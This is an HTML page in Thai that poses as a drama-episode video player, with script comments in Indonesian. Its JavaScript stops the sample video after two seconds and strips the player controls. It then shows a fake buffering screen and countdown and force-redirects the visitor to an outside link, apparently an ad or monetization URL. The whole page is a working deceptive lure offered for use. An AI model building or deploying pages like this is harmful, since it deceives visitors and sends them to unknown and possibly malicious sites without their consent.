<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>รับชมคลิปวิดีโอตอนละครได้ด้านล่าง</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #111;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            max-width: 800px;
            width: 100%;
            padding: 20px;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 1.8rem;
            color: #f1f1f1;
        }

        /* Video Player Container */
        .video-container {
            position: relative;
            width: 100%;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
            background-color: #000;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            overflow: hidden;
            cursor: pointer;
        }

        .video-container video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        /* Overlay Buffering */
        .buffering-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: none; /* Muncul lewat JS setelah diklik & berjalan */
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
            cursor: default;
        }

        /* Spinner Loading */
        .spinner {
            width: 55px;
            height: 55px;
            border: 5px solid #333;
            border-top: 5px solid #ff0000; 
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .buffering-text {
            margin-top: 15px;
            font-size: 1.1rem;
            letter-spacing: 1px;
            font-weight: bold;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-text {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #666;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>รับชมคลิปวิดีโอตอนละครได้ด้านล่าง</h1>
    
    <div class="video-container" onclick="playVideo()">
        <video id="myVideo" controls controlslist="nodownload">
            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
            เบราว์เซอร์ของคุณไม่รองรับการเล่นวิดีโอ
        </video>

        <div class="buffering-overlay" id="bufferingOverlay" onclick="event.stopPropagation();">
            <div class="spinner"></div>
            <div class="buffering-text">กำลังโหลดวิดีโอ... <span id="countdown">3</span> วินาที</div>
        </div>
    </div>

    <p class="footer-text">คลิกที่วิดีโอเพื่อเริ่มเล่น</p>
</div>

<script>
    const video = document.getElementById('myVideo');
    const bufferingOverlay = document.getElementById('bufferingOverlay');
    const countdownText = document.getElementById('countdown');

    // KONEKSI & PENGATURAN WAKTU
    const targetPage = "https://omg10.com/4/11170008"; // Halaman tujuan setelah buffering
    const triggerBufferingAtSecond = 2;          // Menggantung/buffering di detik ke-2 setelah diputar
    let bufferingDuration = 5;                   // Lama waktu buffering ( detik)

    let bufferingTriggered = false;

    // Fungsi untuk memutar video ketika area kotak diklik
    function playVideo() {
        if (video.paused && !bufferingTriggered) {
            video.play();
        }
    }

    // Mendengarkan pergerakan durasi video
    video.addEventListener('timeupdate', () => {
        if (video.currentTime >= triggerBufferingAtSecond && !bufferingTriggered) {
            bufferingTriggered = true;
            
            video.pause(); // Hentikan video secara paksa
            
            // Sembunyikan kontrol bawaan browser saat buffering agar tidak bisa diklik play lagi oleh user
            video.removeAttribute('controls'); 
            
            bufferingOverlay.style.display = 'flex'; // Tampilkan layar loading Thailand

            // Hitung mundur sebelum dialihkan
            const interval = setInterval(() => {
                bufferingDuration--;
                countdownText.innerText = bufferingDuration;

                if (bufferingDuration <= 0) {
                    clearInterval(interval);
                    // Redirect otomatis
                    window.location.replace(targetPage);
                }
            }, 1000);
        }
    });
</script>

</body>
</html>
